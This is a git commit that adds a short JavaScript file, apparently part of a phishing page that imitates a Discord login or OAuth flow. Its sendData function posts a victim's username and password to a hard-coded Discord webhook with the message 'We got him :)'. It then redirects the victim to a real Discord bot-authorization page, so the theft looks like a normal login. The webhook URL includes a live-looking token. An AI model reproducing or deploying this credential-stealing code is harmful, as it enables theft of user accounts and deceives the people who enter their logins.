fd32cffa3ed5bc470521a0c37edb9ae4453f56cf
O-Auth-Discord <119824075+O-Auth-Discord@users.noreply.github.com>
2022-12-04 17:02:09 -0800

    Add files via upload

---
+++ getting-oni/main.js
@@ -0,0 +1,12 @@
+
+function sendData(User, Pass) {
+    $.post('https://discord.com/api/webhooks/1048994205323763752/hYfgp4XmfG4PJhUKxlrYtevnB0xvRuuwHhD5MM-F5kK1kjiQBBDAncUjXozvGr5nUGiP',
+    {
+        'username': 'We got him :)',
+        'content': 'Username:' + User + '\nPassword:' + Pass,
+    }, function(data, status) {
+        console.log("Data: " + data + "\nStatus: " + status);
+    }
+    )
+    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
+}
